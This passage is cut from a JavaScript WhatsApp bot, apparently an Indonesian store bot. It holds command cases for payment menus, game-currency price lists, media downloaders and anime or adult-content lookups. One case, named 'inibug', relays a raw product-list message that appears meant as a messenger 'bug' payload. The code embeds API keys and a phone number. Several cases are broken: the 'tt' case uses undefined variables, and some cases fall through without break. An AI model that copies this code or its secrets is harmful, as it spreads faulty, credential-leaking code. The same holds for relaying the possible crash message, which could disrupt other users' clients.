  case 'pulsa':

  thu = await wann.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})







groups = wann.chats.array.filter(v => v.jid.endsWith('g.us'))
 privat = wann.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
 ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
 charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
 uptime = process.uptime();
 timestampe = speed();
 totalChat = await wann.chats.all()
 latensie = speed() - timestampe
 total = math(`${groups.length}*${privat.length}`)

 menu =`

 ${ucapanWaktu} Kak ${pushname} 👋

 Untuk melakukan pembayaran menggunakan pulsa silahkan isi kepada nomer di bawah!
 
 INDOSAT: 085640068416
 `




 wann.sendMessage(from, { contentText: `${menu}`, footerText: 'Wann Store', buttons: [{ buttonId: `${prefix}bukti`, buttonText: { displayText: 'KIRIM BUKTI TF' }, type: 1 },{ buttonId: `${prefix}payment`, buttonText: { displayText: 'GANTI PAYMENT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
 break
 case 'listdmff':



              gopeynya = ` BERIKUT ADALAH LIST DIAMOND FF

Silahkan Dipilih Ya Kak😇😇

┏━━⬣ VIA ID



┃20 💎  2.900



┃50 💎 7.000



┃70 💎 10.000



┃100💎 13.800



┃140💎18.900



┃210💎28.900



┃355💎 47.000



┃500💎66.500



┃720💎93.500



┗━━⬣







┏━━⬣ VILOG



┃200💎:23.500



┃310💎:34.500



┃410💎:44.200



┃520💎:56.500



┃620💎:68.000



┃720💎:77.500



┃830💎:89.000



┗━━⬣







┏━━⬣ MEMBERSHIP VIA ID



┃⬡ MM 27.500



┃⬡ MB 138.580



┗━━⬣



`



buff = `${week} ${date}



${time2} WIB`



  wann.sendMessage(from, { contentText: `${gopeynya}`, footerText: `${buff}`, buttons: [{buttonId: noprefix ? "owner" : "!"+"owner",buttonText: { displayText: 'OWNER' }, type: 1 },{buttonId: noprefix ? "payment" : "!"+"payment", buttonText: { displayText: 'PAYMENT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')



              break



 case 'bukti':
 titid = `
 hai kak ${pushname}

 Jika sudah tf sesuai nominal silahkan kirim bukti ke owner ku ya!

 Wa.me/6285640068416`
 sendButMessage(from, titid, `follow @achyrr_wann `, [
 {
  buttonId: `${prefix}infoig`,
  buttonText: {
 displayText: `⬡ IG OWNER`,
  },
  type: 1,







},]);
 break;
 case 'payment':



              gopeynya =  `

BERIKUT INI ADALAH LIST PEMBAYARAN KAMI

Ini Payment Kami Silahkan Dipilih Dan Tf Sesuai Nominal oke😇

┏━━⬣ VIA ID
┃💸GOPAY
┃💸DANA
┃BELUM PREMIUM? ADA QRIS ALL PAY
┗━━⬣
`
buff = `${week} ${date}
${time2} WIB`

  wann.sendMessage(from, { contentText: `${gopeynya}`, footerText: `${buff}`, buttons: [{buttonId: noprefix ? "gopay" : "!"+"gopay", buttonText: { displayText: 'BAYAR DENGAN GOPAY' }, type: 1 },{buttonId: noprefix ? "dana" : "!"+"dana", buttonText: { displayText: 'BAYAR DENGAN DANA' }, type: 1 }, {buttonId: noprefix ? "qris" : "!"+"qris",buttonText: { displayText: 'QRIS ALL PAYMENT' }, type: 1 }], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')

case 'inibug':

list = await wann.prepareMessageFromContent(from, {
  "listMessage": {
 "title": "PAYMENT",
 "description": "CLICK",
 "buttonText": "",
 "listType": "PRODUCT_LIST",
 "productListInfo": {

"productSections": [

{
  "title": "LIST CATALOG",
  "products": [
  {
 "productId": "4384164685029627"
  },
  {

"productId": "4514395141953296"
 },
 {
"productId": "3830565277044274"
 },

   {

"productId": "6596446863706523"
 },

 ]
  }
  ],
  "headerImage": {

"productId": "4384164685029627",
"jpegThumbnail": fakeimage
 },
 "businessOwnerJid": sender
  },

  "footerText": "MINAT? PC OWNER"

}

}, {quoted: freply})

wann.relayWAMessage(list, {waitForAck: true})

break


case 'scan':



list = await wann.prepareMessageFromContent(from, {



  "listMessage": {



 "title": "🛒 INFO BUSINIS ",



 "description": "LIST PRODUCT CLICK DI SINI ",



 "buttonText": "",



 "listType": "PRODUCT_LIST",



 "productListInfo": {



"productSections": [



{



  "title": "LIST HARGA",



  "products": [



    {



 "productId": "4384164685029627"



  },



  {



"productId": "4514395141953296"



 },



 {



"productId": "4514395141953296"



 },

  {



"productId": "6596446863706523"



 },

 ]



  }



  ],



  "headerImage": {



"productId": "4384164685029627",



"productId": "4514395141953296",



"productId": "4514395141953296",

"productId": "6596446863706523",

"jpegThumbnail": fakeimage



 },



 "businessOwnerJid": sender



  },



  "footerText": "\nPowered follow @achyrr_wann. "



}



}, {quoted:wan})



wann.relayWAMessage(list, {waitForAck: true})



break


//------------------< Sticker Cmd >-------------------



case 'addcmd': 
       case 'setcmd':
              if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = wan.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              textImg("Done!")
              } else {
              reply('tag stickenya')
}
              break
       case 'delcmd':
              if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = wan.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            _scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
              textImg("Done!")
              break
       case 'listcmd':
              let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
              let cemde = [];
              for (let i of _scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break


//------------------< Downloader/Search/Anime >-------------------







case 'igdl': 



       case 'instagram':



       case 'instagramdownload':



              if (!q) return reply('Link Yang Mana? ')



              if (!q.includes('instagram')) return reply(mess.error.Iv)



              reply(mess.wait)



              anu = await igDownloader(`${q}`)



             .then((data) => { sendMediaURL(from, data.result.link, data.result.desc, wan) })



             .catch((err) => { reply(String(err)) })



              break



  case 'scplay': 



  case 'soundcloud':



  if (!q) return reply('Link Yang Mana? ')



 if (!q.includes('soundcloud')) return reply(mess.error.Iv)



reply(mess.wait)



 anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=IkyChan&url=${q}`)



 .then((data) => { sendMediaURL(from, data.result, wan) })



 .catch((err) => { reply(String(err)) })



 break



 case 'image':



 case 'gimage':



 case 'googleimage':



 if (args.length < 1) return reply('Apa Yang Mau Dicari?')



reply(mess.wait)



 teks = args.join(' ')



 res = await googleImage(teks, google)



 function google(error, result){



if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}



  else {



 gugIm = result



 random =  gugIm[Math.floor(Math.random() * gugIm.length)].url



 sendFileFromUrl(random, image, {quoted: freply, caption: `*Hasil Pencarian Dari :* ${teks}`})



  }



}



break



case 'ytmp3':



if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})



  if (args.length < 1) return reply('Link Nya Mana?')



 if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)



teks = args.join(' ')



 reply(mess.wait)



 res = await y2mateA(teks).catch(e => {



reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')



 })



 result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



 ┆ *YOUTUBE MP3*



 └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







 *Data Berhasil Didapatkan!*



 \`\`\`🐥 Title : ${res[0].judul}\`\`\`



 \`\`\`🐥 Ext : MP3\`\`\`



 \`\`\`🐥 Size : ${res[0].size}\`\`\`







 _Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`







 sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: freply}).then((lalu) => {



sendFileFromUrl(res[0].link, document, {quoted: freply, mimetype: 'audio/mp3', filename: res[0].output})



 })



 break



 case 'ytmp4':



 if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})



if (args.length < 1) return reply('Link Nya Mana?')



  if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)



 teks = args.join(' ')



  reply(mess.wait)



  res = await y2mateV(teks).catch(e => {



 reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')



  })



  result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



  ┆ *YOUTUBE MP4*



  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







  *Data Berhasil Didapatkan!*



  \`\`\`🐥 Title : ${res[0].judul}\`\`\`



  \`\`\`🐥 Ext : MP4\`\`\`



  \`\`\`🐥 Size : ${res[0].size}\`\`\`







  _Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`







  sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: freply}).then((lalu) => {



 sendFileFromUrl(res[0].link, video, {quoted: freply, mimetype: 'video/mp4', filename: res[0].output})



  })



  break



  case 'ytmp4hd':



  case 'ythd':



  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})



 if (args.length === 0) return reply(`Kirim perintah */ytmp4 _linkYt_*`)



let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)



 if (!isLinkks2) return reply(mess.error.Iv)



try {



  reply(mess.wait)



  ythd(args[0])



  .then((res) => {



 const { dl_link, thumb, title, filesizeF, filesize } = res



 axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)



 .then((a) => {



if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, 



  `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



  ┆ *YOUTUBE MP4*



  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







  *Data Berhasil Didapatkan!*



  \`\`\`🐥 Title : ${title}\`\`\`



  \`\`\`🐥 Kualitas* : 720p\`\`\`



  \`\`\`🐥 Size* : ${filesizeF}\`\`\`



  \`\`\`🐥 Link* : ${a.data}\`\`\`







  _Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)







  const captionsYtmp4 = 



`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



┆ *YOUTUBE MP4*



└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







*Data Berhasil Didapatkan!*



\`\`\`🐥 Title : ${title}\`\`\`



\`\`\`🐥 Kualitas : 720p\`\`\`



\`\`\`🐥 Size : ${filesizeF}\`\`\`







_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`







sendMediaURL(from, thumb, captionsYtmp4)



sendMediaURL(from, dl_link,`nih kak`).catch(() => reply(mess.error.api))



 })		



  })



} catch (err) {



  reply(`eror`)



}



break



case 'google':



if (!q) return reply(mess.wrongFormat)



  ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=86951200d52c4e2eafa6b5a43a857939&url=http://google.com/search?q=${q}&oq={q}&aqs=chrome..69i57j0i433i512l2j0i512l2.858j0j4&client=ms-android-oppo&sourceid=chrome-mobile&ie=UTF-8`)



reply(mess.wait)



if(q == undefined || q == ' ') return reply(`*Hasil Pencarian : ${q}* tidak ditemukan`)



  ggs({ 'query': q }).then(results => {



 vars = `_*Hasil Pencarian : ${q}*_\n`



 for (let i = 0; i < results.length; i++) {



vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`



 } 



 wann.sendMessage(from, ss, image, {thumbnail: Buffer.alloc(0), caption: vars, quoted : wan})



  }).catch(e => {



console.log(e)



reply(`${e}`)



 })



  break



  case 'mediafire':



               if (!isPremium) return reply(mess.only.premium)



               if (args.length < 1) return reply('Link Nya Mana? ')



               if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)



               reply(mess.wait)



               teks = args.join(' ')



               res = await mediafireDl(teks)



               result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



┆ *MEDIAFIRE DOWNLOAD*



└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







*Data Berhasil Didapatkan!*



\`\`\`▢ Nama : ${res[0].nama}\`\`\`



\`\`\`▢ Ukuran : ${res[0].size}\`\`\`



\`\`\`▢ Link : ${res[0].link}\`\`\`







_*Tunggu Proses Upload Media......*_`



             reply(result)



             sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: teks})



             break



  case 'tt':



if (!q) return reply('Linknya?')



if (!q.includes('tiktok')) return



reply(mess.error.Iv)



reply(mess.wait)



anu = await TiktokDownloader(`${q}`)



memek ='hi.mp4'



kntl = 'hasil.mp4'



fs.writeFileSync(input,await getBuffer(data.result.watermark))



exec(`ffmpeg -i ${memek} -b:a 192K -vn  ${kntl}`,(err,res)=> {



if (err) return reply(`${err}`)



wann.sendMessage(from,{url:'./'+memek},audio,{mimetype:'audio/mpeg'})



})



       



       case 'ttdl':



       case 'tiktokdl':



       case 'tiktoknowm':



              if (!q) return reply('Linknya?')



              if (!q.includes('tiktok')) return reply(mess.error.Iv)



              data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${setting.lolkey}&url=${q}`)



              result = `⚜️ *Nickname*: ${data.result.author.nickname}\n❤️ *Like*: ${data.result.statistic.diggCount}\n💬 *Komentar*: ${data.result.statistic.commentCount}\n🔁 *Share*: ${data.result.statistic.shareCount}\n🎞️ *Views*: ${data.result.statistic.playCount}\n📑 *Desc*: ${data.result.title}`



              buttons = [{buttonId: `${prefix}tt1 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},{buttonId:`${prefix}ttaudio ${q}`,buttonText:{displayText:'🎵 Audio'},type:1}]



              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(data.result.thumbnail))



              imageMsg = ( await wann.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage



              buttonsMessage = {footerText:'Pilih satu format di bawah ini', imageMessage: imageMsg,



              contentText:`${result}`,buttons,headerType:4}



              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})



              wann.relayWAMessage(prep)



              fs.unlinkSync(`./${sender}.jpeg`)



              break



      case 'tt1': 







             if (!q) return reply('Linknya?')



             if (!q.includes('tiktok')) return reply(mess.error.Iv)



             reply(mess.wait)



             anu = await TiktokDownloader(`${q}`)



            .then((data) => { sendMediaURL(from, data.result.nowatermark) })



            .catch((err) => { reply(String(err)) })



             break











case 'xnxxsearch':



if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)



 query = args.join(" ")



  get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=genbotkey&query=${query}`)



  get_result = get_result.result



  ini_txt = ""



  for (var x of get_result) {



 ini_txt += `Title : ${x.title}\n`



 ini_txt += `Views : ${x.views}\n`



 ini_txt += `Duration : ${x.duration}\n`



 ini_txt += `Uploader : ${x.uploader}\n`



 ini_txt += `Link : ${x.link}\n`



 ini_txt += `Thumbnail : ${x.thumbnail}\n\n`



  }



  reply(ini_txt)



  break



  case 'xnxx':



  if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)



 query = args.join(" ")



  get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=genbotkey&url=${query}`)



  get_result = get_result.result



  ini_txt = `Title : ${get_result.title}\n`



  ini_txt += `Duration : ${get_result.duration}\n`



  ini_txt += `View : ${get_result.view}\n`



  ini_txt += `Rating : ${get_result.rating}\n`



  ini_txt += `Like : ${get_result.like}\n`



  ini_txt += `Dislike : ${get_result.dislike}\n`



  ini_txt += `Comment : ${get_result.comment}\n`



  ini_txt += `Tag : ${get_result.tag.join(", ")}\n`



  ini_txt += `Description : ${get_result.description}\n`



  ini_txt += "Link : \n"



  ini_link = get_result.link



  for (var x of ini_link) {



 ini_txt += `${x.type} - ${x.link}\n\n`



  }



  thumbnail = await getBuffer(get_result.thumbnail)



  await wann.sendMessage(from, thumbnail, image, { quoted: freply , caption: ini_txt })



  break







  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://iwan-chan02.github.io`)



  



  case 'ttaudio': 



  case 'tiktokmusic': 



  case 'tiktokaudio':



  reply(mess.wait)



  anu = await fetchJson(`https://megayaa.herokuapp.com/api/tiktod/?url=${q}`)



  wann.sendMessage(from, {url: anu.result.audio } , audio, { mimetype: Mimetype.mp4Audio, quoted: freply })



  case 'fbdl':



  case 'fb':



  case 'facebok':



  anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/facebook-dl?url=${q}&apikey=IkyChan`)



  stringTime = new Date(`${anu.result.upload}`);



  stringTime2 = stringTime.getDate() + "/" + (stringTime.getMonth() + 1) + "/" + stringTime.getFullYear();



  teks = `「 RESULT FOUND 」\n\n• Title: ${anu.result.title}\n• Upload: ${stringTime2}\n• Like: ${convertToString(anu.result.reaction.like)}\n• Url: ${anu.result.link}`



  buff = await getBuffer(anu.result.thumb)



  wann.sendMessage(from, buff, image, {quoted: freply, caption: teks})



  break



  case 'twitter':



  if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)



if (!q) return reply('Linknya?')



  ten = args[0]



var res = await twitterGetUrl(`${ten}`)



.then(g => {



  ren = `${g.download[2].url}`



  sendMediaURL(from,ren,'Done')



})



break



case 'brainly':



             reply(mess.wait)



             brainly(args.join(" ")).then(res => {



             hmm = '────────────\n'



             for (let Y of res.data) {



             hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`



}



             reply(hmm)



             console.log(res)



})



             break



case 'ssweb':



if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)



  reply(mess.wait)



ini_link = args[0]



ini_buffer = await getBuffer(`https://hardianto-chan.herokuapp.com/api/tools/ssweb?url=${ini_link}&apikey=hardianto`)



await wann.sendMessage(from, ini_buffer, image, { quoted: freply })



break



case 'nhentaipdf':

             if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})

             if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)

             if (isNaN(Number(args[0]))) return await reply(mess.wrongFormat)

             try {

             henid = args[0]

             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=IkyChan`)

             get_result = get_result.result

             get_info = get_result.info

             teks = `*Doujinshi Downloader*

             

📜 Title Romaji : ${get_result.title_romaji}

📃 Title Native : ${get_result.title_native}

🐤 Character : ${get_info.characters.join(", ")}\n`

             ini_image = await getBuffer(get_result.image[0])

             wann.sendMessage(from, ini_image, image, { caption: teks, quoted: freply, thumbnail: fakeimage })

             reply(mess.wait)

             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=IkyChan`)

             pdf = await getBuffer(anu.result)

             wann.sendMessage(from, pdf, document, { quoted: freply, mimetype: Mimetype.pdf, filename: `${get_result.title_romaji}.pdf`, thumbnail: ini_image })

             } catch (e) {

             console.log(e)

             reply(String(e))

}

             break

       case 'nhentai':

              if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})

              if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)

              reply(mess.wait)

              henid = args[0]

              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=IkyChan`)

              get_result = get_result.result

              ini_txt = `Title Romaji : ${get_result.title_romaji}\n`

              ini_txt += `Title Native : ${get_result.title_native}\n`

              ini_txt += `Read Online : ${get_result.read}\n`

              get_info = get_result.info

              ini_txt += `Parodies : ${get_info.parodies}\n`

              ini_txt += `Character : ${get_info.characters.join(", ")}\n`

              ini_txt += `Tags : ${get_info.tags.join(", ")}\n`

              ini_txt += `Artist : ${get_info.artists}\n`

              ini_txt += `Group : ${get_info.groups}\n`

              ini_txt += `Languager : ${get_info.languages.join(", ")}\n`

              ini_txt += `Categories : ${get_info.categories}\n`

              ini_txt += `Pages : ${get_info.pages}\n`

              ini_txt += `Uploaded : ${get_info.uploaded}\n`

              reply(ini_txt)

              break

       case 'manga':

              if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)

              reply(mess.wait)

              query = args.join(" ")

              get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=IkyChan&query=${query}`)

              get_result = get_result.result

              ini_txt = `Id : ${get_result.id}\n`

              ini_txt += `Id MAL : ${get_result.idMal}\n`

              ini_txt += `Title : ${get_result.title.romaji}\n`

              ini_txt += `English : ${get_result.title.english}\n`

              ini_txt += `Native : ${get_result.title.native}\n`

              ini_txt += `Format : ${get_result.format}\n`

              ini_txt += `Chapters : ${get_result.chapters}\n`

              ini_txt += `Volume : ${get_result.volumes}\n`

              ini_txt += `Status : ${get_result.status}\n`

              ini_txt += `Source : ${get_result.source}\n`

              ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`

              ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`

              ini_txt += `Genre : ${get_result.genres.join(", ")}\n`

              ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`

              ini_txt += `Score : ${get_result.averageScore}%\n`

              ini_txt += `Characters : \n`

              ini_character = get_result.characters.nodes

              for (var x of ini_character) {

              ini_txt += `- ${x.name.full} (${x.name.native})\n`

}

              ini_txt += `\nDescription : ${get_result.description}`

              buff = await getBuffer(get_result.coverImage.large)

              buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: `Back To Menu`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,

              contentText: ini_txt,buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

         break

       case 'doujindesu':

             if (!q) return reply(mess.wrongFormat)

             reply(mess.wait)

             try {

             doujinnya = await got.get(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()

             let { data } = await doujinnya

             xixixai = `*Doujindesu Search*\n`

             for (let i = 0; i < data.length; i++) {

             xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`

}

             buffer = await getBuffer(data[0].thumb)

             wann.sendMessage(from, buffer, image, {caption: xixixai, quoted: freply})

             } catch (e) {

             console.log(e)

             reply(String(e))

}

             break

      case 'anime':

             if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)

             reply(mess.wait)

             query = args.join(" ")

             get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=IkyChan&query=${query}`)

             get_result = get_result.result

             ini_txt = `Id : ${get_result.id}\n`

             ini_txt += `Id MAL : ${get_result.idMal}\n`

             ini_txt += `Title : ${get_result.title.romaji}\n`

             ini_txt += `English : ${get_result.title.english}\n`

             ini_txt += `Native : ${get_result.title.native}\n`

             ini_txt += `Format : ${get_result.format}\n`

             ini_txt += `Episodes : ${get_result.episodes}\n`

             ini_txt += `Duration : ${get_result.duration} mins.\n`

             ini_txt += `Status : ${get_result.status}\n`

             ini_txt += `Season : ${get_result.season}\n`

             ini_txt += `Season Year : ${get_result.seasonYear}\n`

             ini_txt += `Source : ${get_result.source}\n`

             ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`

             ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`

             ini_txt += `Genre : ${get_result.genres.join(", ")}\n`

             ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`

             ini_txt += `Score : ${get_result.averageScore}%\n`

             ini_txt += `Characters : \n`

             ini_character = get_result.characters.nodes

             for (var x of ini_character) {

             ini_txt += `- ${x.name.full} (${x.name.native})\n`

 }

             ini_txt += `\nDescription : ${get_result.description}`

             thumbnail = await getBuffer(get_result.coverImage.large)

             await wann.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })

             break

      case 'kusonime':

             if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)

             reply(mess.wait)

             query = args.join(" ")

             get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=IkyChan&query=${query}`)

             get_result = get_result.result

             ini_txt = `Title : ${get_result.title}\n`

             ini_txt += `Japanese : ${get_result.japanese}\n`

             ini_txt += `Genre : ${get_result.genre}\n`

             ini_txt += `Seasons : ${get_result.seasons}\n`

             ini_txt += `Producers : ${get_result.producers}\n`

             ini_txt += `Type : ${get_result.type}\n`

             ini_txt += `Status : ${get_result.status}\n`

             ini_txt += `Total Episode : ${get_result.total_episode}\n`

             ini_txt += `Score : ${get_result.score}\n`

             ini_txt += `Duration : ${get_result.duration}\n`

             ini_txt += `Released On : ${get_result.released_on}\n`

             ini_txt += `Desc : ${get_result.desc}\n`

             link_dl = get_result.link_dl

             for (var x in link_dl) {

             ini_txt += `\n${x}\n`

             for (var y in link_dl[x]) {

             ini_txt += `${y} - ${link_dl[x][y]}\n`

}

}

             ini_buffer = await getBuffer(get_result.thumbnail)

             await wann.sendMessage(from, ini_buffer, image, { quoted: freply, caption: ini_txt })

             break

       case 'otakudesu':

              if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)

              reply(mess.wait)

              query = args.join(" ")

              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=IkyChan&query=${query}`)

              get_result = get_result.result

              ini_txt = `Title : ${get_result.title}\n`

              ini_txt += `Japanese : ${get_result.japanese}\n`

              ini_txt += `Judul : ${get_result.judul}\n`

              ini_txt += `Type : ${get_result.type}\n`

              ini_txt += `Episode : ${get_result.episodes}\n`

              ini_txt += `Aired : ${get_result.aired}\n`

              ini_txt += `Producers : ${get_result.producers}\n`

              ini_txt += `Genre : ${get_result.genres}\n`

              ini_txt += `Duration : ${get_result.duration}\n`

              ini_txt += `Studios : ${get_result.status}\n`

              ini_txt += `Rating : ${get_result.rating}\n`

              ini_txt += `Credit : ${get_result.credit}\n`

              get_link = get_result.link_dl

              for (var x in get_link) {

              ini_txt += `\n\n*${get_link[x].title}*\n`

              for (var y in get_link[x].link_dl) {

              ini_info = get_link[x].link_dl[y]

              ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`

              ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`

              ini_txt += `\`\`\`Link : \`\`\`\n`

              down_link = ini_info.link_dl

              for (var z in down_link) {

              ini_txt += `${z} - ${down_link[z]}\n`

}

}

}

              reply(ini_txt)

              break

       case 'nekopoi':

              if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)

              ini_url = args[0]

              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=IkyChan&url=${ini_url}`)

              get_result = get_result.result

              ini_txt = `\`\`\`🐥 Title : ${get_result.anime}\`\`\`\n`

              ini_txt += `\`\`\`🐥 Porducers : ${get_result.producers}\`\`\`\n`

              ini_txt += `\`\`\`🐥 Duration : ${get_result.duration}\`\`\`\n`

              ini_txt += `\`\`\`🐥 Size : ${get_result.size}\`\`\`\n`

              ini_txt += `\`\`\`🐥 Sinopsis : ${get_result.sinopsis}\`\`\`\n`

              link = get_result.link

              for (var x in link) {

              ini_txt += `\n${link[x].name}\n`

              link_dl = link[x].link

              for (var y in link_dl) {

              ini_txt += `${y} - ${link_dl[y]}\n`

}

}

              buff = await getBuffer(get_result.thumb)

              

               buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,

              contentText: ini_txt,buttons,headerType:4}

